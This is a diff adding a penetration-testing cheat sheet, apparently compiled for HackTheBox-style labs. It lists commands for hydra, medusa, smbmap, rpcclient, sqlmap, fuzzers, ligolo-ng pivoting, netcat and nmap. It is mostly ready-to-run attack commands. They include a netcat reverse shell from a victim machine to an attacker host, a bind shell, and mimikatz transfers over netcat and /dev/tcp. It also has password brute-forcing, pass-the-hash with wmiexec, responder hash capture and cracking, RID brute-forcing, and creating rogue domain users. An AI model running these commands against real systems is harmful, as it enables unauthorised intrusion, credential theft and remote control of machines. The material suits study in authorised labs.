@@ -1,0 +1,550 @@
+
+```toc
+```
+
+###### hydra
+#hydra
+```shell-session
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 8080 http-get /
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 94.237.61.170 -s 35667 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+```
+###### aquatone | eyewitness
+#aquatone #eyewitness
+```
+// Prepare vhosts
+cat hosts.txt
+app.inlanefreight.local
+dev.inlanefreight.local
+drupal-dev.inlanefreight.local
+drupal-qa.inlanefreight.local
+drupal-acc.inlanefreight.local
+drupal.inlanefreight.local
+blog.inlanefreight.local
+
+// Scan with nmap
+nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL hosts.txt
+
+// Scan with eyewitness
+eyewitness --web -x web_discovery.xml -d eyewitness-output
+
+// Scan with aquatone
+cat web_discovery.xml | aquatone -nmap
+```
+###### medusa
+#medusa
+```
+// Brute-force FTP login
+medusa -u bob -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp
+```
+###### ftp
+#ftp #ftp-protocol
+
+```
+-----------------------------------------------------
+GENERAL:
+-----------------------------------------------------
+List of FTP commands: 
+https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
+
+List of FTP server return codes: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
+
+-----------------------------------------------------
+HACKING
+-----------------------------------------------------
+// Login to FTP
+telnet 10.10.10.10 21
+ftp> ls -R (to list recursively current directory)
+ftp> get file.txt (to download file)
+
+// Download all available files from FTP and store them in directory `10.10.10.10`
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10:21
+wget --user ftpuser --password 'Password1' -m ftp://10.10.10.10
+
+// Upload file
+ftp> put shell.php
+ftp> ls
+
+// Brute-force FTP login
+medusa -u bob -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp
+
+// Connect to FTP if service uses SSL
+openssl s_client -connect 10.10.10.10:21 -starttls ftp
+
+```
+### SMB
+#smb #139
+```
+-----------------------------------------------------
+CONNECT AND LIST
+-----------------------------------------------------
+// Connect to a share
+smbmap -H 10.10.10.100
+
+// Connect to a share, and list shares
+smbmap -H 10.10.10.100 -L
+
+// Connect to a share and recursively list share called Public
+smbmap -H 10.10.10.10 -r Public
+
+
+
+// Connect to a share with credentials
+smbmap -H 10.10.10.100 -d active.htb -u bob -p
+Password1
+
+// List share with credentials
+smbclient //10.10.10.100/share-name -U active.htb\\username%password
+
+// Download files
+smbmap -H 10.10.10.10 --download "share-name\note.txt"
+
+// Upload files
+smbmap -H 10.10.10.10 --upload test.txt "share-name\test.txt"
+
+-----------------------------------------------------
+Connect to nc from victim machine
+-----------------------------------------------------
+// From local machine:
+mv nc.exe /tmp/share
+cd /tmp/share
+smbserver.py share smb
+nc -nvlp 9001
+
+// From victim machine
+\\10.10.14.38\share\nc.exe -e cmd.exe 10.10.14.38 9001
+```
+
+###### testssl
+#testssl #ssl #tls
+```
+### Scan a domain
+/opt/testssl.sh/testssl --html 10.10.10.10
+
+### Scan multiple domains for your scope
+for i in $(cat domains.txt); do /opt/testssl.sh/testssl --html $i; done
+```
+###### wpscan
+#wpscan #wordpress
+```
+// Enumerate plugins, themes, and users
+wpscan --url https://example.com --enumerate --api-token TOKEN_HERE
+
+wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log
+
+// Enumerate users
+wpscan --url https://example.com --enumerate u
+
+// Enumerate plugins
+wpscan --url https://example.com --enumerate p
+
+// Enumerate themes
+wpscan --url https://example.com --enumerate t
+
+// Login brute-force
+wpscan --url https://example.com -P passwords.txt -U admin
+
+// Enumerate plugins, themes, users
+```
+##### metasploit
+#metasploit #msf
+```
+meterpreter > load powershell
+Loading extension powershell...Success.
+
+meterpreter > shell
+powershell -ep bypass
+load powershell
+
+meterpreter > shell
+powershell
+
+/// Exploit suggester
+meterpreter > run post/multi/recon/local_exploit_suggester
+```
+###### Steganography
+#steganography #pdfinfo #exiftool #steghide
+```
+/// pdfinfo
+apt install poppler-utils
+pdfinto document.pdf
+
+/// exiftool
+apt install libimage-exiftool-perl
+exiftool image.jpg
+
+/// steghide
+steghide extract -sf image.jpg 
+```
+
+###### impacket-responder
+#responder
+```
+GENERAL:
+- All hashes are stored in /usr/share/responder/logs
+
+/// Capture the hash
+python /usr/share/responder/Responder.py -I tun0 -rdw -v
+
+/// Crack the hash
+hashcat -m 5600 responder_hashes.txt rockyou.txt
+```
+###### smbclient
+#smbclient #smb 
+```
+// SMB discovery:
+nmap --script smb-os-discovery.nse -p445 10.10.10.10
+
+// Access share with NULL credentials and list available shares
+smbclient -L 10.10.10.10 -N
+
+// Connect as NULL and list shares
+smbclient -H //10.10.10.100 -L -N
+
+// Access share with credentials and list shares
+smbclient -U bob \\\\10.10.10.10\\SHARE-NAME
+
+// Connect to a share
+smbclient //10.10.10.100/Replication -U ""%""
+
+// Connect to a share folder
+smbclient //10.10.10.10/SHARE-NAME
+
+// Download files
+smbclient //10.10.10.10/SHARE-NAME
+smb: \> ls
+smb: \> get flag.txt
+
+// DOWNLOAD ALL FILES RECURSIVELY:
+
+smbclient //10.10.10.10/SHARE-NAME
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+
+// Use prefix ! to execute system commands
+smb: \> !cat flag.txt
+
+// Check who is connected to which share (executed from SMB server itself)
+user# smbstatus 
+```
+
+###### wmiexec
+#impacket-wmiexec #wmiexec
+```
+impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54" administrator@10.10.10.10
+```
+
+###### rpcclient
+#rpcclient #smb 
+```
+---------------------------
+GENERAL:
+---------------------------
+- Tool that can enumerate, add, change, remove objects from AD
+- Highly versatile
+
+---------------------------
+AUTHENTICATION
+---------------------------
+// Unauthenticated login to the SMB share
+rpcclient -U '' 10.10.10.10
+rpcclient -U '' -N 10.10.10.10
+rpcclient -U'%' 10.10.10.10
+
+// Authenticated login
+rpcclient -U 'bob' -p 'Password1' -N 10.10.10.10
+rpcclient -U Administrator%Password1 10.10.10.10
+
+---------------------------
+RPCCLIENT BASIC COMMANDS
+---------------------------
+srvinfo - Server information
+enumdomains - Enumerate all domains deployed in the network
+querydominfo - Get domain information
+getdompwinfo - Get domain password policy
+getusrdompwinfo 0x1f4 - Get password policy of particular user
+
+netshareenumall - Enumerate all shares
+netshareenum - Enumerate all shares
+netsharegetinfo <SHARE_NAME> - Enumerate particular share
+
+enumdomgroups - Show all groups
+querygroup 0x200 - Show info on particular group
+
+enumdomusers - Enumerate domain users
+queryuser bob - More user info
+queryuser 0x3e9 - More user info
+
+// Create users
+createdomuser hacker
+setuserinfo2 hacker 24 Password@1
+enumdomusers
+
+// Change user password
+chgpasswd bob Password@1 NewPassword@987
+
+------------------------------------------------------
+NOTE: Sometimes, enumdomusers (which spits all available users) is forbidden query. But, we can use queryuser 0x000 and brute-force this RID until we hit valid one.
+
+Brute-force valid RIDs with this script:
+
+for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+
+An alternative to this would be a Python script from [Impacket] called samrdump.py
+$ impacket-samrdump 10.10.10.10
+------------------------------------------------------
+
+MORE QUERIES HERE: https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
+```
+
+###### sqlmap
+#sqlmap
+```
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+
+// POST request scan name parameter
+sqlmap 'http://example.com/' --data 'uid=1&name=test' -p name
+
+// Scan from a file
+sqlmap -r request.txt -p parameter_to_scan
+```
+
+###### dirb
+#dirb #fuzzing
+```
+dirb https://10.10.10.10/path/ /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+```
+
+###### gobuster
+#gobuster #fuzzing
+```
+gobuster dir -u https://example.com -w directory-list-lowercase-2.3-medium.txt 
+
+// Limit number of threads
+gobuster dir -u https://example.com -w directory-list-lowercase-2.3-medium.txt -t 30
+
+// Fuzz more extensions (.zip, .txt, .html)
+gobuster dir -u https://example.com -w directory-list-lowercase-2.3-medium.txt -x php,txt,zip,html
+
+// Subdomain fuzzing
+gobuster vhost -u example.com -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt 
+```
+###### wfuzz
+#wfuzz #fuzzing
+```
+wfuzz -u https://example.com/FUZZ.php -w directory-list-lowercase-2.3-medium.txt
+
+// Hide status code 
+wfuzz -u https://example.com/FUZZ.php -w directory-list-lowercase-2.3-medium.txt -hc 404
+
+// Hide word count
+wfuzz -u https://example.com/FUZZ.php -w directory-list-lowercase-2.3-medium.txt -hw XXX
+
+// Hide line count
+wfuzz -u https://example.com/FUZZ.php -w directory-list-lowercase-2.3-medium.txt -hl XXX
+
+// Hide character count 
+wfuzz -u https://example.com/FUZZ.php -w directory-list-lowercase-2.3-medium.txt -hh XXX
+
+// Subdomain fuzzing
+wfuzz -u https://example.com -w wordlist.txt -H "Host: FUZZ.example.com" --hc <status codes to hide>
+```
+
+###### ffuf
+#fuzzing #subdomain
+```
+ffuf -u https://example.com/FUZZ -w wordlist.txt:FUZZ 
+
+---------------------------
+// Set number of threads
+ffuf -u https://example.com/FUZZ -w wordlist.txt:FUZZ 
+
+---------------------------
+// Fuzz extensions
+ffuf -u https://example.com/indexFUZZ -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ 
+
+---------------------------
+// Recursive scanning
+- When we scan recursively, it automatically starts another scan under newly identified directory
+ffuf -w /wordlist/path/list.txt:FUZZ -u https://example.com:8080/FUZZ 
+-recursion -recursion-depth 2 -e .php -v
+
+---------------------------
+// Filtering results:
+MATCHER OPTIONS:
+  -mc              Match HTTP status codes, or "all" for everything.
+  -ml              Match amount of lines in response
+  -mr              Match regexp
+  -ms              Match HTTP response size
+  -mw              Match amount of words in response
+
+FILTER OPTIONS:
+  -fc              Filter HTTP status codes from response.
+  -fl              Filter by amount of lines in response.
+  -fr              Filter regexp
+  -fs              Filter HTTP response size
+  -fw              Filter by amount of words in response.
+
+---------------------------
+// Parameter fuzzing
+ffuf 
+-w burp-parameter-names.txt:FUZZ -u https://example.com/admin.php?FUZZ=key 
+-fs 200
+
+---------------------------
+// POST request fuzzing
+ffuf
+-w burp-parameter-names.txt:FUZZ 
+-u https://example.com/admin.php 
+-X POST 
+-d 'FUZZ=key' 
+-H 'Content-Type: application/x-www-form-urlencoded' 
+-fs 200
+
+---------------------------
+// Subdomain fuzzing
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.example.com/
+
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://10.129.17.217 -H "Host: FUZZ.inlanefreight.htb" -fs 10918
+---------------------------
+// VHOST fuzzing
+ffuf 
+-w subdomains-top1million-5000.txt:FUZZ
+-u https://example.com:8080 
+-H 'Host: FUZZ.example.com'
+-fs 200
+
+NOTE: We receive `200 OK` all the time. 
+However, if the virtual host DOES exist and we send a correct Host in the header, we should get a DIFFERENT response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.
+```
+
+###### ligolo-ng
+```
+// Pivot machine:
+- Transfer the agent.exe to pivot machine
+
+// Create device on kali:
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip addr show ligolo
+
+// Start proxy listener on kali:
+./proxy -selfcert
+
+// Start agent.exe on pivot machine:
+./agent.exe -connect 192.168.251.11:11601 -ignore-cert
+
+// Start session on kali:
+[AGENT SHOULD JOIN NOW]
+session (to list sessions)
+ENTER (to select session)
+ifconfig (to list pivot machine's NIC)
+
+// Create new route on Kali. 
+- Here, enter IP address of network that sits behind pivot machine
+ip route add 172.16.2.0/24 dev ligolo
+
+// Start ligolo-ng
+[Agent : DANTE\Administrator@DANTE-DC02] » start
+[Agent : DANTE\Administrator@DANTE-DC02] » INFO[0164] Starting tunnel to DANTE\Administrator@DANTE-DC02
+
+// Test connection:
+ping 172.16.2.101          
+
+PING 172.16.2.101 (172.16.2.101) 56(84) bytes of data.
+64 bytes from 172.16.2.101: icmp_seq=1 ttl=64 time=69.8 ms
+64 bytes from 172.16.2.101: icmp_seq=2 ttl=64 time=76.3 ms
+``` 
+
+###### curl
+#curl
+```
+// Basic Auth Login
+curl -u admin:admin http://example.com:8080
+curl http://admin:admin@example.com:8080
+curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://example.com:8080
+
+// POST request
+curl -X POST -d 'username=admin&password=admin' http://example.com
+
+// Provide cookie header
+curl -b 'PHPSESSID=123' http://example.com
+curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://example.com
+curl -X POST -d '{"search":"flag"}' -H "Cookie: PHPSESSID=123; path=/" -H "Content-Type: application/json" http://206.189.25.173:30199/search.php -v
+```
+
+###### fping
+#fping
+```
+GENERAL:
+- Tool used for pinging each IP in a subnet.
+
+fping -a -g 10.10.10.0/24
+fping -a -g 10.10.10.10 10.10.10.30 // [start-IP end-IP]
+```
+
+###### nc
+#nc 
+```
+// Create TCP listener
+nc -nvlp 9001
+nc -nvlp 9001 -e /bin/bash
+
+// Connect to TCP listener
+nc -v 10.10.10.10 9001
+
+----------------------------
+// Create UDP listener
+nc -nvlpu 9001
+
+// Connect to UDP listener 
+nc -vu 10.10.10.10 9001
+
+----------------------------
+FILE TRANSFERS
+----------------------------
+// Create listener
+nc -nvlp 9001 > mimikatz.exe
+
+// Connect to listener
+nc -nv 10.10.10.10 9001 < mimikatz.exe
+
+----------------------------
+// Create listener
+nc -nv 10.10.10.10 9001 > mimikatz.exe
+
+// Connect to listener
+nc -nvlp 9001 < mimikatz.exe
+
+----------------------------
+// Create listener
+nc -nvlp 9001 < mimikatz.exe
+
+// Connect to listener and download the file
+cat < /dev/tcp/10.10.10.10/9001 > mimikatz.exe
+
+```
+
+###### nmap
+#nmap
+```
+// Scan open ports
+nmap -sT -p- --min-rate 10000 -oA allTCP 10.10.10.10
+nmap -sV --open -oA initialScan 10.10.10.10
+nmap -p- --open -oA fullScan 10.10.10.10
+nmap -sC -sV -p- -oA advancedScan 10.10.10.10
+
+// Host discovery
+nmap -sn 10.10.10.0/24
+nmap -sn 10.10.10.0-30/24
+nmap -sn 10.10.10.*
+nmap -sn 10.10.2-5.*
+nmap -sn -iL hosts.txt
+
+// OS discovery
+nmap -Pn -O 10.10.10.10
+
+// Port scanning
+```
